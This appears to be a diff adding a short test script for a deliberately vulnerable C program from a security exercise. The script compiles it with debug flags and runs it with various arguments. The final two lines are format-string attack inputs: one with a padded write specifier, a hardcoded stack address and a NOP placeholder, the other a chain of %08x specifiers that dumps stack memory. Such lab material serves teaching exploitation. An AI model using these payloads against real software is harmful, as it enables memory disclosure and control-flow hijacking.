@@ -1,0 +1,9 @@
+gcc -ggdb -o0 -Wall -pedantic VulnerableCode.c -o VulnerableCode
+
+./VulnerableCode 7 4 a.exe 
+./VulnerableCode 7 } a.exe
+./VulnerableCode 3 ~ a.exe
+./VulnerableCode 5 a.exe
+./VulnerableCode 4 a.exe
+./VulnerableCode_1 8 "%497d\x3c\xd3\xff\xbf<nops>"
+./VulnerableCode_1 8 "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\n"
